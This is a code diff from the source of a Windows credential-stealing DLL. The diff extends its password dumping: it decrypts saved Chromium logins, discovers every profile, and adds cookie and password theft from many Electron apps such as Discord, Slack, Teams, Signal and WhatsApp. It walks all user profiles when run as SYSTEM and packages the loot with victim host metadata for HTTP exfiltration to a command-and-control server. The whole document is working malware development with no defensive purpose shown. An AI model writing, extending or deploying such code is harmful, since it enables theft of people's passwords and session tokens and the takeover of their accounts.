-        if(rc||!con){ DbgInt("DumpPasswords: S_open failed", rc); continue; }
-        Dbg("DumpPasswords: S_open OK");
-        void* st=NULL;
-        const wchar_t* SQL = L"SELECT origin_url, username_value, password_value FROM logins;";
-        rc=S_prep(con,SQL,-1,&st,NULL);
-        if(rc){ DbgInt("DumpPasswords: S_prep failed", rc); S_close(con); continue; }
-        Dbg("DumpPasswords: S_prep OK, stepping");
-        int rows=0, dec_ok=0, dec_fail=0;
-        while(S_step(st)==100){
-            rows++;
-            const char* url=(const char*)S_blob(st,0); int url_len=S_bytes(st,0);
-            const char* user=(const char*)S_blob(st,1); int user_len=S_bytes(st,1);
-            const char* enc=(const char*)S_blob(st,2); int enc_len=S_bytes(st,2);
-
-            // Decrypt password (same as cookies: v10/v20 + AES-256-GCM)
-            // Note: passwords do NOT have the SHA256 domain hash prefix (only cookies do).
-            // DecCookie will check SHA256(url) and not strip since it won't match.
-            // Chromium stores passwords as UTF-16LE; convert to UTF-8 for JSON.
-            // Same oversized-blob hazard as cookies in DumpChromium: password blobs are
-            // heap-allocated by size instead of a fixed 4KB stack buffer.
-            char* pwd = (enc_len > 0 && enc_len <= 4194304)
-                ? (char*)VirtualAlloc(NULL, (size_t)enc_len * 2, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
-            int pwd_len=0;
-            bool pwd_ok = false;
-            if(pwd && enc_len > 3 && enc[0]=='v'){
-                pwd_ok = DecCookie((const unsigned char*)enc, enc_len, (unsigned char*)pwd, &pwd_len, url);
-            }
-            if(pwd_ok){
-                dec_ok++;
-                // Chrome stores the password as UTF-16LE. An ASCII password is
-                // valid UTF-8 and stays as-is; anything else (accents) is
-                // converted. The old odd-byte-zero test turned "senha@ção"
-                // into binary garbage on the target.
-                if(pwd_len >= 2 && pwd_len % 2 == 0 && !LooksUtf8(pwd, pwd_len)){
-                    // Convert UTF-16LE to UTF-8 (BMP). The output buffer is 2x the
-                    // blob size: a 2-byte code unit can become 3 UTF-8 bytes, and
-                    // the old in-place conversion could write past enc_len.
-                    int u8len = 0;
-                    for(int k=0; k<pwd_len; k+=2){
-                        unsigned short ch = (unsigned char)pwd[k] | ((unsigned char)pwd[k+1] << 8);
-                        if(ch < 0x80) pwd[u8len++] = (char)ch;
-                        else if(ch < 0x800){ pwd[u8len++]=(char)(0xC0|(ch>>6)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
-                        else { pwd[u8len++]=(char)(0xE0|(ch>>12)); pwd[u8len++]=(char)(0x80|((ch>>6)&0x3F)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
-                    }
-                    pwd_len = u8len;
-                }
-            }
-            else{
-                // Decryption failed â€” write empty value instead of raw encrypted bytes
-                // (raw v10 blobs are useless and pollute the JSON with binary garbage)
-                pwd_len = 0;
-                dec_fail++;
-            }
-
-            RecStart();
-            // Store as a cookie-like entry for easy exfil
-            PutS("\"domain\":"); PutJ(url, url_len);
-            PutS(",\"name\":\"password\"");
-            { char b8[64]; int bl=ToUtf8(name,b8,sizeof(b8));
-              PutS(",\"browser\":"); PutJ(b8, bl);
-              char p8[64]; int pl=ToUtf8(pname,p8,sizeof(p8));
-              PutS(",\"profile\":"); PutJ(p8, pl); }
-            PutS(",\"value\":"); PutJ(pwd, pwd_len);
-            PutS(",\"path\":\"/\"");
-            PutS(",\"expirationDate\":0,\"sameSite\":\"None\"");
-            PutS(",\"secure\":true,\"httpOnly\":true,\"hostOnly\":false,\"session\":true");
-            PutS(",\"_username\":"); PutJ(user, user_len);
-            PutS("}");
-            if(pwd) VirtualFree(pwd, 0, MEM_RELEASE);
-        }
-        DbgInt("DumpPasswords: rows extracted", rows);
-        DbgInt("DumpPasswords: decrypted OK", dec_ok);
-        DbgInt("DumpPasswords: decrypt failed", dec_fail);
-        S_fin(st); S_close(con);
+    wchar_t tmp[MAX_PATH];
+    if(!CopyDb(prof, tmp, MAX_PATH, exe, L"logins")){
+        Dbg("DumpPasswords: copy failed");
+        SrcAdd("logins", name, pname, prof, 0, 0, 0, "locked");
+        return;
     }
+    Dbg("DumpPasswords: copy OK");
+
+    char path8[1024]; ToUtf8(tmp,path8,sizeof(path8));
+    void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
+    if(rc||!con){
+        DbgInt("DumpPasswords: S_open failed", rc);
+        SrcAdd("logins", name, pname, prof, 0, 0, 0, "locked");
+        return;
+    }
+    Dbg("DumpPasswords: S_open OK");
+    void* st=NULL;
+    const wchar_t* SQL = L"SELECT origin_url, username_value, password_value FROM logins;";
+    rc=S_prep(con,SQL,-1,&st,NULL);
+    if(rc){
+        DbgInt("DumpPasswords: S_prep failed", rc); S_close(con);
+        SrcAdd("logins", name, pname, prof, 0, 0, 0, "unsupported");
+        return;
+    }
+    Dbg("DumpPasswords: S_prep OK, stepping");
+    int rows=0, dec_ok=0, dec_fail=0;
+    while(S_step(st)==100){
+        rows++;
+        const char* url=(const char*)S_blob(st,0); int url_len=S_bytes(st,0);
+        const char* user=(const char*)S_blob(st,1); int user_len=S_bytes(st,1);
+        const char* enc=(const char*)S_blob(st,2); int enc_len=S_bytes(st,2);
+
+        // Decrypt password (same as cookies: v10/v20 + AES-256-GCM)
+        // Note: passwords do NOT have the SHA256 domain hash prefix (only cookies do).
+        // DecCookie will check SHA256(url) and not strip since it won't match.
+        // Chromium stores passwords as UTF-16LE; convert to UTF-8 for JSON.
+        // Same oversized-blob hazard as cookies in DumpChromium: password blobs are
+        // heap-allocated by size instead of a fixed 4KB stack buffer.
+        char* pwd = (enc_len > 0 && enc_len <= 4194304)
+            ? (char*)VirtualAlloc(NULL, (size_t)enc_len * 2, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
+        int pwd_len=0;
+        bool pwd_ok = false;
+        if(pwd && enc_len > 3 && enc[0]=='v'){
+            pwd_ok = DecCookie((const unsigned char*)enc, enc_len, (unsigned char*)pwd, &pwd_len, url);
+        }
+        if(pwd_ok){
+            dec_ok++;
+            // Chrome stores the password as UTF-16LE. An ASCII password is
+            // valid UTF-8 and stays as-is; anything else (accents) is
+            // converted. The old odd-byte-zero test turned "senha@ção"
+            // into binary garbage on the target.
+            if(pwd_len >= 2 && pwd_len % 2 == 0 && !LooksUtf8(pwd, pwd_len)){
+                // Convert UTF-16LE to UTF-8 (BMP). The output buffer is 2x the
+                // blob size: a 2-byte code unit can become 3 UTF-8 bytes, and
+                // the old in-place conversion could write past enc_len.
+                int u8len = 0;
+                for(int k=0; k<pwd_len; k+=2){
+                    unsigned short ch = (unsigned char)pwd[k] | ((unsigned char)pwd[k+1] << 8);
+                    if(ch < 0x80) pwd[u8len++] = (char)ch;
+                    else if(ch < 0x800){ pwd[u8len++]=(char)(0xC0|(ch>>6)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
+                    else { pwd[u8len++]=(char)(0xE0|(ch>>12)); pwd[u8len++]=(char)(0x80|((ch>>6)&0x3F)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
+                }
+                pwd_len = u8len;
+            }
+        }
+        else{
+            // Decryption failed â€” write empty value instead of raw encrypted bytes
+            // (raw v10 blobs are useless and pollute the JSON with binary garbage)
+            pwd_len = 0;
+            dec_fail++;
+        }
+
+        RecStart();
+        // Store as a cookie-like entry for easy exfil
+        PutS("\"domain\":"); PutJ(url, url_len);
+        PutS(",\"name\":\"password\"");
+        { char b8[64]; int bl=ToUtf8(name,b8,sizeof(b8));
+          PutS(",\"browser\":"); PutJ(b8, bl);
+          char p8[64]; int pl=ToUtf8(pname,p8,sizeof(p8));
+          PutS(",\"profile\":"); PutJ(p8, pl); }
+        PutS(",\"value\":"); PutJ(pwd, pwd_len);
+        PutS(",\"path\":\"/\"");
+        PutS(",\"expirationDate\":0,\"sameSite\":\"None\"");
+        PutS(",\"secure\":true,\"httpOnly\":true,\"hostOnly\":false,\"session\":true");
+        PutS(",\"_username\":"); PutJ(user, user_len);
+        PutS("}");
+        if(pwd) VirtualFree(pwd, 0, MEM_RELEASE);
+    }
+    DbgInt("DumpPasswords: rows extracted", rows);
+    DbgInt("DumpPasswords: decrypted OK", dec_ok);
+    DbgInt("DumpPasswords: decrypt failed", dec_fail);
+    const char* skip = "";
+    if(rows>0 && dec_ok==0 && g_need20 && !g_has20) skip = "no-key";
+    else if(rows>0 && dec_ok==0 && dec_fail>0 && !g_has10) skip = "v10-fail";
+    SrcAdd("logins", name, pname, prof, rows, dec_ok, dec_fail, skip);
+    S_fin(st); S_close(con);
     Dbg("DumpPasswords: done");
+}
+
+// One Login Data per profile directory, discovered instead of assuming the
+// names Default / Profile 1..9 -- custom-named profiles were invisible.
+static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_t* exe){
+    wchar_t pat[1024]; lstrcpyW(pat,root); lstrcatW(pat,L"\\*");
+    WIN32_FIND_DATAW fd; HANDLE f=FindFirstFileW(pat,&fd);
+    if(f!=INVALID_HANDLE_VALUE){
+        do{
+            if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+            if(fd.cFileName[0]==L'.') continue;
+            wchar_t prof[1024]; lstrcpyW(prof,root); lstrcatW(prof,L"\\");
+            lstrcatW(prof,fd.cFileName); lstrcatW(prof,L"\\Login Data");
+            if(GetFileAttributesW(prof)==INVALID_FILE_ATTRIBUTES) continue;
+            DumpPasswordDb(name, fd.cFileName, prof, exe);
+        } while(FindNextFileW(f,&fd));
+        FindClose(f);
+    }
+    // Electron/CEF userData root can hold Login Data directly.
+    wchar_t prof[1024]; lstrcpyW(prof,root); lstrcatW(prof,L"\\Login Data");
+    if(GetFileAttributesW(prof)!=INVALID_FILE_ATTRIBUTES)
+        DumpPasswordDb(name, L".", prof, exe);
 }
 
 // ------------------------------------------------------------------ HTTP exfiltration (Winsock2)
@@ -1314,9 +1644,41 @@ static bool ExfilHTTP(const char* url){
 }
 
 // ------------------------------------------------------------------ exfiltration sink
+// Stage-2 wire shape: {"records":[...],"coverage":{...}}. The listener accepts
+// both this and the bare list, so an old payload still lands.
+static long long NowUnix(void){
+    FILETIME ft; GetSystemTimeAsFileTime(&ft);
+    unsigned long long t = ((unsigned long long)ft.dwHighDateTime<<32) | ft.dwLowDateTime;
+    return (long long)(t/10000000ULL) - 11644473600LL;
+}
+
+static void EmitCoverage(void){
+    VictimName();
+    PutS(",\"coverage\":{\"ts\":"); PutN(NowUnix());
+    PutS(",\"host\":"); PutJ(g_victim, lstrlenA(g_victim));
+    // run id: pid is enough to tell two executions apart on one host
+    PutS(",\"run\":\"r"); PutN((long long)GetCurrentProcessId()); PutS("\"");
+    PutS(",\"sources\":[");
+    for(int i=0;i<g_src_n;i++){
+        SrcRow* s=&g_src[i];
+        if(i) PutS(",");
+        PutS("{\"kind\":");       PutJ(s->kind,    lstrlenA(s->kind));
+        PutS(",\"browser\":");    PutJ(s->browser, lstrlenA(s->browser));
+        PutS(",\"profile\":");    PutJ(s->profile, lstrlenA(s->profile));
+        PutS(",\"path\":");       PutJ(s->path,    lstrlenA(s->path));
+        PutS(",\"rows\":");       PutN(s->rows);
+        PutS(",\"decrypted\":");  PutN(s->dec);
+        PutS(",\"failed\":");     PutN(s->failed);
+        PutS(",\"skipped\":");    PutJ(s->skip,    lstrlenA(s->skip));
+        PutS("}");
+    }
+    PutS("]}}");
+}
+
 // Priority: 1) HTTP POST to C2 (if sentinel was patched), 2) named pipe, 3) local file
 static bool Sink(void){
     PutS("]");
+    EmitCoverage();
     if(g_out) g_out[g_len]=0; else return false;   // nothing was ever buffered (OOM)
 
     // 1. If C2 URL is configured (sentinel replaced by pick.py), exfiltrate via HTTP
@@ -1502,27 +1864,72 @@ extern "C" __declspec(dllexport) void CALLBACK noop(HWND, HINSTANCE, LPSTR, int)
 // pinpoint crashes without the loader lock swallowing the exception
 extern "C" __declspec(dllexport) DWORD WINAPI entry_stub(void*, unsigned long, void*){ return 1; }
 
+// Curated CEF/Electron stores. These are Chromium userData roots: a Cookies
+// database at the root (older Electron) or under Network\Cookies, plus
+// profile-like subdirectories. Discord/Slack/Teams/Spotify/Notion/Obsidian/
+// VS Code/Signal/Element/WhatsApp/Steam all keep a decryptable jar here.
+struct CefApp { const wchar_t* name; const wchar_t* rel; const wchar_t* exe; };
+static CefApp g_cef[] = {
+    {L"discord",   L"\\discord",                                                    L"discord.exe"},
+    {L"slack",     L"\\Slack",                                                      L"slack.exe"},
+    {L"teams",     L"\\Microsoft\\Teams",                                           L"Teams.exe"},
+    {L"teams-msix",L"\\Packages\\MSTeams_8wekyb3d8bbwe\\LocalCache\\Microsoft\\MSTeams\\EBWebView", L"ms-teams.exe"},
+    {L"spotify",   L"\\Spotify",                                                    L"Spotify.exe"},
+    {L"notion",    L"\\Notion",                                                     L"Notion.exe"},
+    {L"obsidian",  L"\\Obsidian",                                                   L"Obsidian.exe"},
+    {L"vscode",    L"\\Code",                                                       L"Code.exe"},
+    {L"signal",    L"\\Signal",                                                     L"Signal.exe"},
+    {L"element",   L"\\Element",                                                    L"Element.exe"},
+    {L"whatsapp",  L"\\WhatsApp",                                                   L"WhatsApp.exe"},
+    {L"steam",     L"\\Steam\\htmlcache",                                           L"steamwebhelper.exe"},
+};
+
+static void DumpCefStores(const wchar_t* la, const wchar_t* aa, bool notice){
+    for(unsigned i=0;i<sizeof(g_cef)/sizeof(g_cef[0]);i++){
+        wchar_t root[1024]; lstrcpyW(root,la); lstrcatW(root,g_cef[i].rel);
+        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES){
+            lstrcpyW(root,aa); lstrcatW(root,g_cef[i].rel);
+        }
+        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES){
+            if(notice){
+                wchar_t miss[1024]; lstrcpyW(miss,la); lstrcatW(miss,g_cef[i].rel);
+                SrcAdd("cef",L"",g_cef[i].name,miss,0,0,0,"missing");
+            }
+            continue;
+        }
+        Dbg("DumpCefStores: found store");
+        LoadLocalState(g_cef[i].name, root);
+        DumpChromium(g_cef[i].name, root, g_cef[i].exe, "cef");
+        DumpPasswords(g_cef[i].name, root, g_cef[i].exe);
+    }
+}
+
 // One (local, roaming) pair = one Windows profile. Dumping a single pair was
 // enough while the payload ran as the user; a SYSTEM payload sees only
 // systemprofile under %LOCALAPPDATA%, where no browser has ever run, so the user
 // profiles have to be enumerated (same reason cookielog.py walks C:\Users).
-static void DumpRoots(const wchar_t* la, const wchar_t* aa){
+// notice: emit "missing" coverage rows once, on the first roots pass only.
+static void DumpRoots(const wchar_t* la, const wchar_t* aa, bool notice){
     for(unsigned i=0;i<sizeof(g_br)/sizeof(g_br[0]);i++){
         wchar_t root[1024]; lstrcpyW(root,la); lstrcatW(root,g_br[i].rel);
         wchar_t alt[1024];  lstrcpyW(alt,aa);  lstrcatW(alt,g_br[i].rel);
         if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) lstrcpyW(root,alt);
-        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) continue;
+        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES){
+            if(notice) SrcAdd("chromium", g_br[i].name, L".", root, 0, 0, 0, "missing");
+            continue;
+        }
         Dbg("payload_entry: found chromium profile");
         LoadLocalState(g_br[i].name, root);
-        DumpChromium(g_br[i].name,root,g_br[i].exe);
+        DumpChromium(g_br[i].name,root,g_br[i].exe,"chromium");
         DumpPasswords(g_br[i].name,root,g_br[i].exe);
     }
     Dbg("payload_entry: before DumpFirefox");
-    DumpFirefox(aa);
+    DumpFirefox(aa, notice);
     Dbg("payload_entry: after DumpFirefox");
     Dbg("payload_entry: before DumpDiscordTokens");
     DumpDiscordTokens(aa);
     Dbg("payload_entry: after DumpDiscordTokens");
+    DumpCefStores(la, aa, notice);
 }
 
 extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD reason, LPVOID)
@@ -1557,9 +1964,9 @@ extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD r
     bool have_aa = GetEnvironmentVariableW(L"APPDATA",aa,1024) != 0;
     if(!have_la || !have_aa){ Dbg("payload_entry: no LOCALAPPDATA/APPDATA"); return 2; }
     Dbg("payload_entry: env OK, dumping");
-    PutS("[");
-    Dbg("payload_entry: after PutS([, entering chromium loop");
-    DumpRoots(la, aa);
+    PutS("{\"records\":[");
+    Dbg("payload_entry: after PutS(records[, entering chromium loop");
+    DumpRoots(la, aa, true);
     // SYSTEM: the user profiles are not reachable through the environment, so
     // enumerate C:\Users. Duplicate roots are skipped to avoid re-dumping.
     WIN32_FIND_DATAW fd;
@@ -1576,7 +1983,7 @@ extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD r
             if(lstrcmpiW(ul,la)==0 && lstrcmpiW(ua,aa)==0) continue;
             if(GetFileAttributesW(ul)==INVALID_FILE_ATTRIBUTES) continue;
             Dbg("payload_entry: dumping another user profile");
-            DumpRoots(ul, ua);
+            DumpRoots(ul, ua, false);
         } while(FindNextFileW(u, &fd));
         FindClose(u);
     }
